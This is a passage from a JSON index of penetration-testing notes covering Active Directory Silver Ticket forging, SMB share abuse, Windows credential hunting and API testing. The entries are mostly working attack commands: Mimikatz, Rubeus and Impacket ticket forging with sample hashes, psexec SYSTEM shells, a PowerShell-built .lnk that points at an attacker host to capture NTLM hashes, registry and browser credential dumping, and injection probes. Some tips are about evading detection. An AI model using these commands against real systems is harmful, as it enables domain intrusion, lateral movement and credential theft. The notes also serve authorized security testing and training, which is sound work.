KRB5CCNAME\r\n```\r\n\r\n---\r\n\r\n# Tips\r\n\r\n- A Silver Ticket only grants access to the **specified service**.\r\n- The Domain Controller is **not contacted** during authentication, making Silver Tickets relatively stealthy.\r\n- CIFS (`cifs`) is the most commonly abused SPN for administrative file share access.\r\n- Verify the service account actually owns the target SPN before forging the ticket.\r\n- Both RC4 (NTLM) and AES keys can be used if supported by the environment.\r\n- Always verify the ticket with `klist` before attempting authentication.\r\n\r\n---\r\n\r\n# Checklist\r\n\r\n- [ ] Recover the Domain SID.\r\n- [ ] Recover the service account NTLM hash or AES key.\r\n- [ ] Identify the target SPN.\r\n- [ ] Forge the Silver Ticket.\r\n- [ ] Inject or load the ticket.\r\n- [ ] Verify the ticket using `klist`.\r\n- [ ] Authenticate to the target service.\r\n- [ ] Purge the ticket after testing.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "mimikatz",
      "rubeus",
      "impacket",
      "psexec",
      "winrm",
      "kerberoasting",
      "silver ticket",
      "golden ticket",
      "ldap",
      "smb",
      "kerberos"
    ],
    "size": 5615,
    "lineCount": 281
  },
  {
    "id": "silver-ticket",
    "title": "Silver-Ticket",
    "category": "Active Directory & Kerberos",
    "filePath": "Silver-Ticket.md",
    "content": "# Silver Ticket: Complete Guide\r\n\r\nA Silver Ticket is a forged Kerberos Service Ticket (TGS) that allows you to access a specific service on a specific machine without needing the domain controller or the `krbtgt` hash.\r\n\r\n---\r\n\r\n## When to Use Silver Tickets\r\n\r\n### Use When:\r\n* You have the service account's NTLM hash (e.g., from Kerberoasting).\r\n* You need access to a specific service (not the whole domain).\r\n* You are on a machine and want to move laterally.\r\n* The target machine's service is running under a known account.\r\n* You do not have Domain Admin privileges but have a service account hash.\r\n* You want to avoid detection (does not contact the Domain Controller for validation).\r\n\r\n### Don't Use When:\r\n* You have Domain Admin privileges (use a Golden Ticket instead).\r\n* You need access to ALL services on a machine (use a Golden Ticket).\r\n* You do not possess the target service account's hash.\r\n\r\n---\r\n\r\n## Why Use Silver Tickets?\r\n\r\n| Reason | Explanation |\r\n| :--- | :--- |\r\n| **No DC Contact** | Service tickets are validated locally by the target service, not the Domain Controller. |\r\n| **Less Detection** | No TGS request logs (Event ID 4769) are generated on the DC (only local logs on the target host). |\r\n| **Works with Any Account** | You only need the service account's hash to forge access. |\r\n| **Persistence** | The ticket remains functional even if the active account password changes (provided you use the correct corresponding hash). |\r\n| **Quick Access** | Bypasses the requirement to crack complex passwords into cleartext. |\r\n\r\n---\r\n\r\n## How Many Ways to Create Silver Tickets?\r\n\r\nThere are 5 main methods commonly utilized to generate and leverage Silver Tickets:\r\n\r\n### Method 1: Mimikatz (Windows - Most Common)\r\n\r\n#### Syntax:\r\n```powershell\r\nmimikatz.exe \"kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOST> /service:<SERVICE> /rc4:<NTLM_HASH> /user:<USER_TO_IMPERSONATE> /ptt\" exit\r\n\r\n# Get Domain SID\r\nwhoami /user\r\n# Output SID: S-1-5-21-3623811015-3361044348-30300820-1001\r\n\r\n# Create Silver Ticket for CIFS (SMB) on TEST as Administrator\r\nmimikatz.exe \"kerberos::golden /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:test.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt\" exit\r\n\r\n# Verify the ticket injection\r\nklist\r\n\r\n# Access target host file share\r\ndir \\\\test.local\\C$\r\n```\r\n\r\n### Method 2: Rubeus (Windows - Alternative)\r\n#### Syntax:\r\n```powershell\r\nRubeus.exe silver /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOST> /service:<SERVICE> /rc4:<NTLM_HASH> /user:<USER> /ptt\r\n\r\n# Example:\r\nRubeus.exe silver /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:test.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt\r\n```\r\n\r\n### Method 3: Impacket `ticketer.py` (Linux)\r\n#### Syntax:\r\n```bash\r\nticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -nthash <NTLM_HASH> -spn <SERVICE>/<TARGET_HOST> <USER>\r\n\r\n# Generate the ticket cache file\r\nticketer.py -domain resourced.local -domain-sid S-1-5-21-3623811015-3361044348-30300820 -nthash 19a3a7550ce8c505c2d46b5e39d6f808 -spn cifs/test.local Administrator\r\n\r\n# Set the environment variable to use the ticket\r\nexport KRB5CCNAME=$(pwd)/Administrator.ccache\r\n\r\n# Authenticate using Kerberos authentication without a password\r\nimpacket-psexec resourced/Administrator@test.local -k -no-pass\r\n```\r\n\r\n### Method 4: Impacket `ticketConverter.py` (Linux - Convert Tickets)\r\n```bash\r\nIf you already possess a .kirbi file extracted from a Windows environment, it can be converted for Linux compatibility:\r\n\r\n# Convert .kirbi to .ccache\r\nticketConverter.py ticket.kirbi ticket.ccache\r\n\r\n# Load and execute via Kerberos\r\nexport KRB5CCNAME=$(pwd)/ticket.ccache\r\nimpacket-psexec resourced/Administrator@test.local -k -no-pass\r\n```\r\n\r\n# Services You Can Target\r\n\r\n| Service | Authorized Access Gained | Verification Example Command |\r\n|---------|---------------------------|------------------------------|\r\n| **cifs** | SMB access (file shares, administrative utilities) | `dir \\\\target\\C$` |\r\n| **http** | Web interface interaction (IIS, WinRM-over-HTTP) | PowerShell Remoting |\r\n| **wsman** | WinRM access (PowerShell Management) | `Enter-PSSession -ComputerName targethost` |\r\n| **RDP** | Remote Desktop Protocol connection capability | `mstsc /v:target` |\r\n| **krbtgt** | **Note:** Used for Golden Tickets, **not** Silver Tickets | Domain Admin privileges |\r\n| **ldap** | Active Directory database queries | `dsquery *` |\r\n| **mssqlsvc** | Microsoft SQL Server instance access | `sqlcmd -S target` |\r\n| **exchange** | Exchange Mail Server control | Automated client mailbox sync |\r\n| **time** | Host system clock synchronization | NTP infrastructure queries |\r\n\r\n# Practical Example Scenario\r\n\r\n**Context:** You have recovered the **svc_mssql** account hash from a Kerberoasting attack and need to target the server **test.local**.\r\n\r\n---\r\n\r\n## Step 1: Recover the Domain SID\r\n\r\n### Option A: From an Established Windows Session\r\n\r\n```cmd\r\nwhoami /user\r\n```\r\n\r\n### Option B: From an External Linux Platform (Impacket)\r\n\r\n```bash\r\nimpacket-lookupsid test/testuser@192.168.216.175 \\\r\n-hashes :19a3a7550ce8c505c2d46b5e39d6f808\r\n```\r\n\r\n**Resulting Domain SID:**\r\n\r\n```text\r\nS-1-5-21-3623811015-3361044348-30300820\r\n```\r\n\r\n---\r\n\r\n## Step 2: Create the Silver Ticket for TEST\r\n\r\n### Option A: Linux (Impacket `ticketer.py`)\r\n\r\n```bash\r\nticketer.py \\\r\n-domain test.local \\\r\n-domain-sid S-1-5-21-3623811015-3361044348-30300820 \\\r\n-nthash 19a3a7550ce8c505c2d46b5e39d6f808 \\\r\n-spn cifs/test.local \\\r\nAdministrator\r\n\r\nexport KRB5CCNAME=$(pwd)/Administrator.ccache\r\n```\r\n\r\n### Option B: Windows (Mimikatz)\r\n\r\n```powershell\r\nmimikatz.exe \"kerberos::golden /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:test.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt\" exit\r\n```\r\n\r\n---\r\n\r\n## Step 3: Access the Target Host\r\n\r\n### Enumerate Administrative File Shares\r\n\r\n```cmd\r\ndir \\\\test.local\\C$\r\n```\r\n\r\n### Spawn an Administrative SYSTEM Shell\r\n\r\n```cmd\r\npsexec \\\\test.local -s cmd.exe\r\n```\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "mimikatz",
      "rubeus",
      "impacket",
      "psexec",
      "winrm",
      "kerberoasting",
      "silver ticket",
      "golden ticket",
      "ldap",
      "smb",
      "kerberos",
      "rce",
      "persistence"
    ],
    "size": 6174,
    "lineCount": 175
  },
  {
    "id": "ad-checklist-05-smb-share-enumeration-file-discovery",
    "title": "SMB Share Enumeration & File Discovery",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/05. SMB Share Enumeration & File Discovery.md",
    "content": "# SMB Share Enumeration & File Discovery\r\n\r\n## Objective\r\n\r\nEnumerate all accessible SMB shares using every set of credentials obtained during the assessment. Misconfigured shares often expose sensitive files, credentials, Group Policy Preferences (GPP), scripts, backups, or writable locations that can be leveraged for further compromise.\r\n\r\n---\r\n\r\n## 1. Enumerate SMB Shares\r\n\r\nWhenever you obtain new credentials, enumerate the available SMB shares.\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --shares\r\n```\r\n\r\n### Using NTLM Hashes\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH> --shares\r\n```\r\n\r\n> **Note:** Every newly discovered user may have access to different shares.\r\n\r\n---\r\n\r\n## 2. Enumerate Every Accessible Share\r\n\r\nDo not ignore default shares—they often contain valuable information.\r\n\r\nCheck:\r\n\r\n- `SYSVOL`\r\n- `NETLOGON`\r\n- `IPC$`\r\n- `ADMIN$` (if accessible)\r\n- `C$` (if accessible)\r\n- All custom/non-default shares\r\n\r\nConnect to a share:\r\n\r\n```bash\r\nsmbclient //<TARGET_IP>/<SHARE_NAME> -U <USER>\r\n```\r\n\r\n---\r\n\r\n## 3. Recheck Shares for Every New User\r\n\r\nWhenever new credentials are obtained:\r\n\r\n- Re-enumerate accessible shares.\r\n- Compare access permissions.\r\n- Look for newly accessible directories and files.\r\n\r\n> Different users frequently have access to different departmental or administrative shares.\r\n\r\n---\r\n\r\n## 4. Search for Interesting Files\r\n\r\nLook for:\r\n\r\n- Passwords\r\n- Configuration files\r\n- Backup files\r\n- Scripts\r\n- SSH keys\r\n- Database exports\r\n- Private keys\r\n- Documentation\r\n- Scheduled task files\r\n- `.kdbx` (KeePass)\r\n- `.ps1`, `.bat`, `.vbs`\r\n- `.config`, `.ini`, `.xml`\r\n- `.rdp`\r\n- `.ovpn`\r\n- `.pem`, `.pfx`, `.p12`\r\n\r\n---\r\n\r\n## 5. Check for Group Policy Preferences (GPP)\r\n\r\nInspect the `SYSVOL` share for Group Policy Preference files containing encrypted credentials.\r\n\r\nCommon location:\r\n\r\n```text\r\nSYSVOL\\<DOMAIN>\\Policies\\\r\n```\r\n\r\nSearch for:\r\n\r\n```text\r\nGroups.xml\r\nServices.xml\r\nScheduledTasks.xml\r\nDrives.xml\r\nDataSources.xml\r\nPrinters.xml\r\n```\r\n\r\nIf a `cpassword` value is discovered:\r\n\r\n```bash\r\ngpp-decrypt <CPASSWORD>\r\n```\r\n\r\n> **Purpose:** Recover plaintext credentials stored in legacy Group Policy Preferences.\r\n\r\n---\r\n\r\n## 6. Identify Writable Shares\r\n\r\nDetermine whether the current user has write access.\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --shares\r\n```\r\n\r\nAlternatively, upload a test file:\r\n\r\n```bash\r\nsmbclient //<TARGET_IP>/<SHARE_NAME> -U <USER>\r\n```\r\n\r\nInside the SMB session:\r\n\r\n```text\r\nput test.txt\r\n```\r\n\r\nIf successful, the share is writable.\r\n\r\n---\r\n\r\n## 7. Assess Writable Shares for NTLM Credential Capture\r\n\r\nWritable SMB shares can often be abused to capture NTLM authentication from users browsing the share.\r\n\r\n### Monitor for Incoming Authentication\r\n\r\nLinux:\r\n\r\n```bash\r\nsudo responder -I <INTERFACE>\r\n```\r\n\r\nWindows:\r\n\r\n```powershell\r\nImport-Module .\\Inveigh.ps1\r\nInvoke-Inveigh -NBNS Y -ConsoleOutput Y\r\n```\r\n\r\n> **Tip:** In Windows environments, Inveigh is often a better choice than Responder when operating from a compromised host.\r\n\r\n---\r\n\r\n### Create a Malicious Shortcut (.lnk)\r\n\r\nInstead of relying on users to open a file, create a shortcut that references an attacker-controlled SMB share.\r\n\r\nExample PowerShell:\r\n\r\n```powershell\r\n$objShell = New-Object -ComObject WScript.Shell\r\n$lnk = $objShell.CreateShortcut(\"C:\\Users\\Public\\Documents\\invoice.lnk\")\r\n$lnk.TargetPath = \"\\\\<ATTACKER_IP>\\share\\file.txt\"\r\n$lnk.IconLocation = \"\\\\<ATTACKER_IP>\\share\\icon.ico\"\r\n$lnk.Save()\r\n```\r\n\r\n> **Why this works:** Windows Explorer attempts to retrieve the shortcut icon while rendering the directory, which can trigger NTLM authentication **without the user opening the shortcut**.\r\n\r\n---\r\n\r\n### Don't Assume User Interaction\r\n\r\nMany users or automated processes simply browse a directory.\r\n\r\nEven if no one opens the shortcut, Windows Explorer may request the icon automatically, resulting in NTLM authentication.\r\n\r\n---\r\n\r\n### Verify the Trigger\r\n\r\nIf no credentials are captured:\r\n\r\n- Verify the share is actively accessed.\r\n- Wait and monitor for scheduled access.\r\n- Confirm the shortcut references your listener.\r\n- Test with both Responder and Inveigh where appropriate.\r\n\r\n> **Don't assume the attack failed immediately—some shares are only accessed periodically by users or automated processes.**\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Enumerate SMB shares using every new credential.\r\n- [ ] Inspect all default and custom shares.\r\n- [ ] Recheck shares after obtaining additional users.\r\n- [ ] Search for passwords, backups, scripts, and configuration files.\r\n- [ ] Inspect `SYSVOL` for Group Policy Preference files.\r\n- [ ] Decrypt any discovered `cpassword` values.\r\n- [ ] Identify writable shares.\r\n- [ ] Assess writable shares for NTLM hash capture opportunities.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "smb",
      "rce",
      "sudo"
    ],
    "size": 4803,
    "lineCount": 209
  },
  {
    "id": "ad-checklist-07-windows-post-exploitation-credential-hunting",
    "title": "Windows Post-Exploitation & Credential Hunting",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/07. Windows Post-Exploitation & Credential Hunting.md",
    "content": "# Windows Post-Exploitation & Credential Hunting\r\n\r\n## Objective\r\n\r\nPerform comprehensive local enumeration to identify privilege escalation opportunities, recover stored credentials, discover sensitive files, and collect information that can be used for lateral movement or domain compromise.\r\n\r\n---\r\n\r\n# 1. Automated Enumeration\r\n\r\nStart with automated enumeration to quickly identify common privilege escalation vectors.\r\n\r\n## WinPEAS\r\n\r\n```powershell\r\n.\\winPEASx64.exe\r\n.\\winPEASx86.exe\r\n.\\winPEASany.exe\r\n```\r\n\r\n## Other Useful Enumeration Tools\r\n\r\n- Seatbelt\r\n- SharpUp\r\n- PowerUp\r\n- PrivescCheck\r\n\r\n> Automated tools should supplement, not replace manual enumeration.\r\n\r\n---\r\n\r\n# 2. Local Privilege Escalation\r\n\r\nAfter enumeration, identify potential privilege escalation vectors.\r\n\r\nCheck for:\r\n\r\n- [ ] Unquoted service paths\r\n- [ ] Weak service permissions\r\n- [ ] Writable services\r\n- [ ] AlwaysInstallElevated\r\n- [ ] SeImpersonatePrivilege\r\n- [ ] SeBackupPrivilege\r\n- [ ] Scheduled tasks\r\n- [ ] DLL hijacking opportunities\r\n- [ ] Vulnerable installed software\r\n- [ ] Token impersonation opportunities\r\n\r\n---\r\n\r\n# 3. PowerShell History\r\n\r\nPowerShell history frequently contains passwords and administrative commands.\r\n\r\n## Current User\r\n\r\n```powershell\r\n(Get-PSReadLineOption).HistorySavePath\r\n```\r\n\r\n```powershell\r\nGet-Content (Get-PSReadLineOption).HistorySavePath\r\n```\r\n\r\n## All Users\r\n\r\n```powershell\r\nforeach($user in (Get-ChildItem C:\\Users).FullName){Get-Content \"$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue}\r\n```\r\n\r\n---\r\n\r\n# 4. Stored Credentials\r\n\r\nWindows Credential Manager often stores reusable credentials.\r\n\r\n```cmd\r\ncmdkey /list\r\n```\r\n\r\nLook for:\r\n\r\n- Saved RDP credentials\r\n- SMB credentials\r\n- Administrative accounts\r\n- Service accounts\r\n\r\n---\r\n\r\n# 5. Registry Credential Hunting\r\n\r\nThese are worth checking individually because they frequently contain credentials or useful configuration:\r\n\r\n```cmd\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\r\n\r\nreg query \"HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\"\r\n\r\nreg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\"\r\n\r\nreg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\"\r\n```\r\n\r\nLook for:\r\n\r\n- AutoLogon credentials\r\n- PuTTY saved sessions\r\n- Stored usernames\r\n- Connection information\r\n\r\n---\r\n\r\n# 6. Registry Keyword Hunting\r\n\r\nSearch the Windows registry for stored credentials, connection strings, API keys, and other sensitive information.\r\n\r\n## Search for Passwords\r\n\r\n```cmd\r\nreg query HKLM /f pass /t REG_SZ /s\r\n```\r\n\r\n```cmd\r\nreg query HKCU /f pass /t REG_SZ /s\r\n```\r\n\r\n## Search for Other Common Keywords\r\n\r\n```cmd\r\nreg query HKLM /f password /t REG_SZ /s\r\n```\r\n\r\n```cmd\r\nreg query HKLM /f pwd /t REG_SZ /s\r\n```\r\n\r\n```cmd\r\nreg query HKLM /f secret /t REG_SZ /s\r\n```\r\n\r\n```cmd\r\nreg query HKLM /f token /t REG_SZ /s\r\n```\r\n\r\n```cmd\r\nreg query HKLM /f api /t REG_SZ /s\r\n```\r\n\r\n```cmd\r\nreg query HKLM /f key /t REG_SZ /s\r\n```\r\n\r\n> **Look for:**\r\n>\r\n> - Application credentials\r\n> - AutoLogon passwords\r\n> - Database connection strings\r\n> - API keys\r\n> - Service account passwords\r\n> - Encryption keys\r\n\r\n---\r\n# 7. Browser Credential Recovery\r\n\r\nRecover locally stored browser credentials.\r\n\r\n## SharpChrome\r\n\r\n```powershell\r\n.\\SharpChrome.exe logins /unprotect\r\n```\r\n\r\n## LaZagne\r\n\r\n```powershell\r\n.\\lazagne.exe all\r\n```\r\n\r\n## Firefox\r\n\r\n```bash\r\nfirefox_decrypt\r\n```\r\n\r\n---\r\n\r\n# 8. File System Hunting\r\n\r\nSearch the file system for credentials and sensitive data.\r\n\r\n## Common Enumeration\r\n\r\n```cmd\r\ntree /f /a\r\n```\r\n\r\n```cmd\r\ndir C:\\ /s /b /a\r\n```\r\n\r\n```powershell\r\nGet-ChildItem C:\\ -Recurse -Force\r\n```\r\n\r\n---\r\n\r\n## Search for Interesting Files\r\n\r\n```powershell\r\nGet-ChildItem -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {$_.Extension -match '\\.(db|kdbx|mdb|sqlite|sqlite3|sql|bak|old|backup|zip|7z|rar|tar|gz|ini|conf|cfg|xml|json|yml|yaml|ps1|bat|cmd|vbs|env|key|pem|ppk|pfx|cer|txt|log|cred)$'}\r\n```\r\n\r\nLook for:\r\n\r\n- KeePass databases\r\n- Configuration files\r\n- SSH keys\r\n- Certificates\r\n- Password files\r\n- SQL backups\r\n- Logs\r\n- Archives\r\n- Scripts\r\n\r\n---\r\n\r\n# 9. Database Enumeration (MySQL)\r\n\r\nDetermine whether MySQL is installed locally.\r\n\r\n```cmd\r\nwhere /r C:\\ mysql.exe\r\n```\r\n\r\nor\r\n\r\n```powershell\r\nGet-ChildItem C:\\ -Recurse -Filter mysql.exe -ErrorAction SilentlyContinue\r\n```\r\n\r\nIf discovered:\r\n\r\n```cmd\r\nmysql.exe -u root -e \"SHOW DATABASES;\"\r\n```\r\n\r\n```cmd\r\nmysql.exe -u root -e \"SELECT * FROM targetdb.users;\"\r\n```\r\n\r\nIf direct access is restricted, consider forwarding the local database port through your existing session (for example, using a port-forwarding tool) and connect from your attacking machine.\r\n\r\n---\r\n\r\n# 10. Deep Enumeration\r\n\r\nContinue manual inspection after automated tools complete.\r\n\r\nReview:\r\n\r\n- C:\\\r\n- Program Files\r\n- Program Files (x86)\r\n- Users\r\n- XAMPP\r\n- IIS directories\r\n- Backup folders\r\n- Application directories\r\n\r\nInspect:\r\n\r\n- Configuration files\r\n- Hidden files\r\n- Log files\r\n- Documentation\r\n- Installation folders\r\n\r\n---\r\n\r\n# 11. Metadata Analysis\r\n\r\nInspect documents for usernames, file paths, and other metadata.\r\n\r\nExample:\r\n\r\n```bash\r\nexiftool -a -u <FILE>\r\n```\r\n\r\nUseful file types:\r\n\r\n- PDF\r\n- DOCX\r\n- XLSX\r\n- PPTX\r\n- Images\r\n\r\n---\r\n\r\n# 12. Password Reuse\r\n\r\nWhenever a password is recovered:\r\n\r\n- Test it against all discovered users.\r\n- Test SMB, WinRM, LDAP, MSSQL, SSH and RDP.\r\n- Test local authentication.\r\n- Check for administrative access.\r\n- Test for password reuse across services.\r\n\r\n> Password reuse is one of the most common privilege escalation paths during internal Active Directory assessments.\r\n\r\n---\r\n\r\n# Manual Checklist\r\n\r\n- [ ] Run WinPEAS.\r\n- [ ] Review local privilege escalation vectors.\r\n- [ ] Check PowerShell history.\r\n- [ ] Enumerate Credential Manager.\r\n- [ ] Hunt for registry credentials.\r\n- [ ] Recover browser credentials.\r\n- [ ] Search the entire file system.\r\n- [ ] Look for databases.\r\n- [ ] Inspect application configuration.\r\n- [ ] Enumerate hidden files.\r\n- [ ] Analyze document metadata.\r\n- [ ] Test every recovered credential everywhere.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "winrm",
      "winpeas",
      "ldap",
      "smb",
      "sqli",
      "rce",
      "privesc",
      "lateral movement"
    ],
    "size": 6173,
    "lineCount": 328
  },
  {
    "id": "web-checklist-08-api-security-testing",
    "title": "API Security Testing",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/08. API Security Testing.md",
    "content": "# API Security Testing\r\n\r\n## Objective\r\n\r\nIdentify vulnerabilities in REST, GraphQL, SOAP, and other APIs by testing authentication, authorization, object access, input validation, rate limiting, business logic, and hidden functionality.\r\n\r\n> **Rule:** Treat the API as a separate application. Never assume the web UI exposes every available endpoint.\r\n\r\n---\r\n\r\n# 1. Discover API Endpoints\r\n\r\nIdentify all API endpoints.\r\n\r\nSources:\r\n\r\n- JavaScript files\r\n- Network tab\r\n- Burp Suite Proxy\r\n- Swagger/OpenAPI\r\n- GraphQL Playground\r\n- Mobile applications\r\n- Source code\r\n\r\nCommon paths:\r\n\r\n```\r\n/api\r\n/api/v1\r\n/api/v2\r\n/swagger\r\n/swagger-ui\r\n/openapi.json\r\n/graphql\r\n/docs\r\n/redoc\r\n```\r\n\r\n---\r\n\r\n# 2. Map the API\r\n\r\nDocument:\r\n\r\n- Endpoints\r\n- Methods\r\n- Parameters\r\n- Authentication\r\n- Request Body\r\n- Response Format\r\n\r\nUnderstand how objects relate to each other before testing.\r\n\r\n---\r\n\r\n# 3. Authentication Testing\r\n\r\nDetermine:\r\n\r\n- Authentication required?\r\n- JWT?\r\n- Session Cookie?\r\n- API Key?\r\n- OAuth?\r\n- Basic Auth?\r\n\r\nTest:\r\n\r\n- Missing authentication\r\n- Expired tokens\r\n- Invalid tokens\r\n- Anonymous access\r\n\r\n---\r\n\r\n# 4. Authorization Testing (BOLA / IDOR)\r\n\r\nTest every object identifier.\r\n\r\nExamples:\r\n\r\n```\r\nGET /api/users/10\r\n```\r\n\r\n↓\r\n\r\n```\r\nGET /api/users/11\r\n```\r\n\r\nCommon objects:\r\n\r\n- Users\r\n- Orders\r\n- Files\r\n- Tickets\r\n- Messages\r\n- Invoices\r\n\r\n---\r\n\r\n# 5. Function-Level Authorization (BFLA)\r\n\r\nTest privileged endpoints.\r\n\r\nExamples:\r\n\r\n```\r\nPOST /api/admin/create-user\r\nDELETE /api/users/15\r\nPUT /api/settings\r\n```\r\n\r\nAttempt access as:\r\n\r\n- Guest\r\n- Standard User\r\n- Different User\r\n\r\n---\r\n\r\n# 6. Mass Assignment\r\n\r\nAdd additional JSON properties.\r\n\r\nExample:\r\n\r\n```json\r\n{\r\n    \"username\":\"test\",\r\n    \"role\":\"admin\",\r\n    \"isAdmin\":true,\r\n    \"verified\":true,\r\n    \"permissions\":[\"*\"]\r\n}\r\n```\r\n\r\nCommon fields:\r\n\r\n- role\r\n- admin\r\n- isAdmin\r\n- active\r\n- verified\r\n- permissions\r\n- tenant\r\n- accountType\r\n\r\n---\r\n\r\n# 7. Input Validation\r\n\r\nTest every parameter.\r\n\r\nExamples:\r\n\r\n```\r\n'\r\n\"\r\n../\r\n{{7*7}}\r\n;id\r\n```\r\n\r\nAlso test:\r\n\r\n- SQLi\r\n- NoSQLi\r\n- SSTI\r\n- XSS\r\n- Command Injection\r\n\r\n---\r\n\r\n# 8. HTTP Method Testing\r\n\r\nTry:\r\n\r\n- GET\r\n- POST\r\n- PUT\r\n- PATCH\r\n- DELETE\r\n- OPTIONS\r\n\r\nSome APIs only validate authorization on specific methods.\r\n\r\n---\r\n\r\n# 9. Content-Type Testing\r\n\r\nChange:\r\n\r\n```\r\napplication/json\r\n```\r\n\r\n↓\r\n\r\n```\r\napplication/xml\r\n```\r\n\r\n↓\r\n\r\n```\r\nmultipart/form-data\r\n```\r\n\r\n↓\r\n\r\n```\r\ntext/plain\r\n```\r\n\r\nDifferent parsers may behave differently.\r\n\r\n---\r\n\r\n# 10. HTTP Verb Tampering\r\n\r\nExamples:\r\n\r\n```\r\nGET → POST\r\nPOST → PUT\r\nPUT → PATCH\r\nDELETE → POST\r\n```\r\n\r\nAuthorization may differ by HTTP method.\r\n\r\n---\r\n\r\n# 11. Parameter Pollution\r\n\r\nDuplicate parameters.\r\n\r\nExample:\r\n\r\n```\r\nid=5&id=6\r\n```\r\n\r\n---\r\n\r\n# 12. Hidden Parameters\r\n\r\nTest for undocumented parameters.\r\n\r\nExamples:\r\n\r\n```\r\nadmin=true\r\ndebug=true\r\ninternal=true\r\ntest=true\r\n```\r\n\r\nUse:\r\n\r\n- Burp Param Miner\r\n- ffuf\r\n- Arjun\r\n\r\n---\r\n\r\n# 13. Rate Limiting\r\n\r\nDetermine:\r\n\r\n- Login rate limits\r\n- OTP limits\r\n- Password reset limits\r\n- Registration limits\r\n- API throttling\r\n\r\nTest:\r\n\r\n- Burp Intruder\r\n- Turbo Intruder\r\n\r\n---\r\n\r\n# 14. JWT Testing\r\n\r\nInspect:\r\n\r\n- Header\r\n- Payload\r\n- Signature\r\n- Expiration\r\n- Algorithm\r\n\r\nReview claims such as:\r\n\r\n- role\r\n- admin\r\n- permissions\r\n- userid\r\n\r\n---\r\n\r\n# 15. GraphQL Testing\r\n\r\nIf GraphQL is present:\r\n\r\nCheck:\r\n\r\n- Introspection\r\n- Hidden queries\r\n- Hidden mutations\r\n- Field-level authorization\r\n- Object-level authorization\r\n\r\nUseful tools:\r\n\r\n- GraphQL Voyager\r\n- InQL\r\n- Clairvoyance\r\n\r\n---\r\n\r\n# 16. Swagger / OpenAPI\r\n\r\nReview:\r\n\r\n- Hidden endpoints\r\n- Deprecated endpoints\r\n- Admin APIs\r\n- Internal APIs\r\n- Example requests\r\n\r\nSwagger often exposes functionality not linked from the UI.\r\n\r\n---\r\n\r\n# 17. API Versioning\r\n\r\nTest:\r\n\r\n```\r\n/api/v1/\r\n/api/v2/\r\n/api/internal/\r\n/api/dev/\r\n```\r\n\r\nOlder API versions may lack security controls.\r\n\r\n---\r\n\r\n# 18. Business Logic\r\n\r\nTest:\r\n\r\n- Negative values\r\n- Duplicate requests\r\n- Race conditions\r\n- Price manipulation\r\n- Workflow bypass\r\n- Approval bypass\r\n\r\n---\r\n\r\n# 19. Sensitive Data Exposure\r\n\r\nReview API responses for:\r\n\r\n- Password hashes\r\n- API keys\r\n- Internal IPs\r\n- Stack traces\r\n- Email addresses\r\n- User roles\r\n- Debug information\r\n\r\n---\r\n\r\n# 20. API Fuzzing\r\n\r\nFuzz:\r\n\r\n- Parameters\r\n- Headers\r\n- JSON properties\r\n- Endpoints\r\n\r\nUseful tools:\r\n\r\n- ffuf\r\n- Burp Intruder\r\n- Turbo Intruder\r\n- Arjun\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- APIs often expose functionality that is not available in the web interface.\r\n- Test every object identifier for BOLA (IDOR).\r\n- Compare requests between different user roles.\r\n- Review Swagger/OpenAPI documentation before fuzzing.\r\n- Change HTTP methods and Content-Types—they frequently reveal inconsistent authorization checks.\r\n- Replay requests and test for race conditions on critical operations.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Discover API endpoints.\r\n- [ ] Map the API.\r\n- [ ] Test authentication.\r\n- [ ] Test BOLA / IDOR.\r\n- [ ] Test function-level authorization.\r\n- [ ] Test mass assignment.\r\n- [ ] Test input validation.\r\n- [ ] Test HTTP methods.\r\n- [ ] Test Content-Type handling.\r\n- [ ] Test parameter pollution.\r\n- [ ] Discover hidden parameters.\r\n- [ ] Test rate limiting.\r\n- [ ] Review JWTs.\r\n- [ ] Test GraphQL.\r\n- [ ] Review Swagger/OpenAPI.\r\n- [ ] Test API versioning.\r\n- [ ] Test business logic.\r\n- [ ] Check for sensitive data exposure.\r\n- [ ] Fuzz API parameters.",
    "headings": [],
    "commands": [],
    "tags": [
      "ffuf",
      "burp",
      "graphql",
      "jwt",
      "idor",
      "sqli",
      "rce",
      "xss"
    ],
    "size": 5449,
    "lineCount": 430
  },
  {
    "id": "web-checklist-05-authentication-session-management-testing",
    "title": "Authentication & Session Management Testing",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/05. Authentication & Session Management Testing.md",
